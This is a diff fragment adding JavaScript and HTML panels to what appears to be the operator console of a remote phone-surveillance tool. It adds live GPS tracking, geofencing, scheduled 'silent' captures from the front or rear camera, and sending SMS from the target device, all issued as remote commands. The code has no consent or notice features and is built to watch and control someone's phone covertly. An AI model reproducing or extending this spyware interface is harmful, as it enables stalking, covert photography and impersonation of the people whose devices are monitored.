+                    document.getElementById('gfLon').value = lng.toFixed(6);
+                    if (marker) m.removeLayer(marker);
+                    if (circle) m.removeLayer(circle);
+                    marker = L.marker([lat, lng]).addTo(m);
+                    const r = parseFloat(document.getElementById('gfRadius').value) || 500;
+                    circle = L.circle([lat, lng], { radius: r, color: '#1976ff', fillOpacity: 0.15 }).addTo(m);
+                });
+            } catch(e) { console.warn('Leaflet not loaded:', e); }
+        }, 200);
+    }
+
+    // ── Live GPS tracking ────────────────────────────────────────────────────
+    let liveGpsActive = false;
+
+    function toggleLiveGps() {
+        if (!liveGpsActive) {
+            sendCommand('START_GPS_UPDATES');
+            liveGpsActive = true;
+            const btn = document.getElementById('liveGpsBtn');
+            if (btn) {
+                btn.querySelector('span:last-child').textContent = 'Stop GPS Track';
+                btn.style.background = '#d32f2f';
+                btn.style.color = '#fff';
+            }
+            showNotification('🛰️ Live GPS tracking started');
+            logActivity('Live GPS tracking started');
+        } else {
+            sendCommand('STOP_GPS_UPDATES');
+            liveGpsActive = false;
+            const btn = document.getElementById('liveGpsBtn');
+            if (btn) {
+                btn.querySelector('span:last-child').textContent = 'Live GPS Track';
+                btn.style.background = '';
+                btn.style.color = '';
+            }
+            showNotification('GPS tracking stopped');
+            logActivity('Live GPS tracking stopped');
+        }
+    }
+
+    function setGeofence() {
+        const lat = parseFloat(document.getElementById('gfLat').value);
+        const lon = parseFloat(document.getElementById('gfLon').value);
+        const radius = parseFloat(document.getElementById('gfRadius').value) || 500;
+        if (isNaN(lat) || isNaN(lon)) { showNotification('Enter valid coordinates'); return; }
+        sendCommand('SET_GEOFENCE', { lat, lon, radius });
+    }
+
+    function useLocationAsGeofence(lat, lon) {
+        sendCommand('SET_GEOFENCE', { lat, lon, radius: 500 });
+        showNotification(`✅ Geofence set at ${lat.toFixed(4)}, ${lon.toFixed(4)} (500m radius)`);
+    }
+
+    // ── Scheduled capture panel ──────────────────────────────────────────────
+    function showSchedulePanel() {
+        panel.innerHTML = `
+            <h3>⏱️ Auto Screenshot Capture</h3>
+            <p style="color:#666;font-size:13px;margin-bottom:16px;">Schedule silent camera captures at regular intervals.</p>
+            <div style="display:flex;gap:12px;flex-wrap:wrap;align-items:center;background:#f9f9f9;border-radius:10px;padding:16px;">
+                <div>
+                    <label style="font-size:12px;color:#999;">Interval (minutes)</label>
+                    <input id="schedInterval" type="number" value="5" min="1" max="60"
+                        style="display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:100px;margin-top:4px;">
+                </div>
+                <div>
+                    <label style="font-size:12px;color:#999;">Camera</label>
+                    <select id="schedCam" style="display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;margin-top:4px;">
+                        <option value="0">Rear</option>
+                        <option value="1">Front</option>
+                    </select>
+                </div>
+                <div style="align-self:flex-end;display:flex;gap:8px;">
+                    <button onclick="startScheduledCapture()" style="padding:8px 18px;background:#4caf50;color:#fff;border:none;border-radius:8px;cursor:pointer;">▶ Start</button>
+                    <button onclick="sendCommand('STOP_SCHEDULED_CAPTURE')" style="padding:8px 18px;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer;">■ Stop</button>
+                </div>
+            </div>
+            <p style="color:#999;font-size:12px;margin-top:12px;">Images will appear automatically in the Camera panel when captured.</p>`;
+    }
+
+    function startScheduledCapture() {
+        const intervalMinutes = parseInt(document.getElementById('schedInterval').value) || 5;
+        const cameraId = parseInt(document.getElementById('schedCam').value);
+        sendCommand('SET_SCHEDULED_CAPTURE', { intervalMinutes, cameraId });
+        showNotification(`Auto-capture set every ${intervalMinutes} min`);
+    }
+
+    // ── Send SMS panel ───────────────────────────────────────────────────────
+    function showSendSmsPanel() {
+        panel.innerHTML = `
+            <h3>✉️ Send SMS</h3>
+            <div style="display:flex;flex-direction:column;gap:12px;max-width:400px;margin-top:12px;">
+                <div>
+                    <label style="font-size:12px;color:#999;display:block;margin-bottom:4px;">Phone Number</label>
+                    <input id="smsNumber" type="tel" placeholder="+91 99999 00000"
+                        style="width:100%;padding:8px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;">
+                </div>
+                <div>
+                    <label style="font-size:12px;color:#999;display:block;margin-bottom:4px;">Message</label>
+                    <textarea id="smsBody" rows="4" placeholder="Type your message…"
+                        style="width:100%;padding:8px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;resize:vertical;"></textarea>
+                </div>
+                <button onclick="doSendSms()" style="padding:10px 20px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;">
+                    📤 Send Message
+                </button>
+            </div>`;
+    }
+
+    function doSendSms() {
+        const number = document.getElementById('smsNumber').value.trim();
+        const body = document.getElementById('smsBody').value.trim();
+        if (!number || !body) { showNotification('Enter number and message'); return; }
+        sendCommand('SEND_SMS', { number, body });
+    }
+
+    // ── Utility: filter table rows ────────────────────────────────────────────
+    function filterTable(inputId, tbodyId) {
+        const query = document.getElementById(inputId).value.toLowerCase();
+        const rows = document.getElementById(tbodyId).querySelectorAll('tr');
+        rows.forEach(row => {
+            row.style.display = row.innerText.toLowerCase().includes(query) ? '' : 'none';
+        });
+    }
+
+    // ════════════════════════════════════════════════════════════════════════
+    // UPDATED handleJSON — route new message types
+    // ════════════════════════════════════════════════════════════════════════
+
+    </script>
 </body>
 </html>
